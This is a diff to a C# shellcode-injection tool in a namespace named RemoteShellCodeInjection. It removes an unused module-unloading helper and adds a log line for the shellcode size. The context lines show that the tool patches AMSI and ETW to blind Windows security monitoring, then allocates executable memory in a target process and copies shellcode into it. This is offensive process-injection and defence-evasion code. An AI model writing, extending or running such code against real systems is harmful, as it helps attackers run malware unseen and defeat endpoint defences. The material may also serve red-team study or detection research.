@@ -118,7 +118,6 @@ namespace RemoteShellCodeInjection
                         Console.WriteLine("[-] Aborting...");
                         return;
                     }
-
                 }
             }
             if (!selfinject && string.IsNullOrEmpty(pname))
@@ -168,22 +167,6 @@ namespace RemoteShellCodeInjection
             PatchAMSIAndETW.Run();
             Inject(hProc, assemblyBytes);
         }
-        static void UnloadModule(string moduleName)
-        {
-            Process process = Process.GetCurrentProcess();
-            ProcessModule? module = process.Modules.Cast<ProcessModule>()
-                .FirstOrDefault(m => m.ModuleName == moduleName);
-            if (module != null)
-            {
-                // Unload the module
-                FreeLibrary(module.BaseAddress);
-                Console.WriteLine($"{moduleName} module was successfully unloaded.");
-            }
-            else
-            {
-                Console.WriteLine($"{moduleName} module was not found.");
-            }
-        }
         private static string CleanSC(string shellString)
         {
             shellString = shellString.Trim().Replace("\n", string.Empty).Replace("\t", string.Empty).Replace("\r", string.Empty).Replace(" ", string.Empty);
@@ -199,6 +182,7 @@ namespace RemoteShellCodeInjection
             // Allocate memory in the target process for the remote assembly
             IntPtr remoteAssembly = IntPtr.Zero;
             UIntPtr remoteAssemblySize = (UIntPtr)1024;
+            Console.WriteLine($"[*] Shellcode final size {assemblyBytes.Length}");
             Console.WriteLine("[*] Allocating memory...");
             NtAllocateVirtualMemory(hProc, ref remoteAssembly, 0, ref remoteAssemblySize, 0x1000, 0x40);
             Console.WriteLine("[*] Copying Shellcode...");
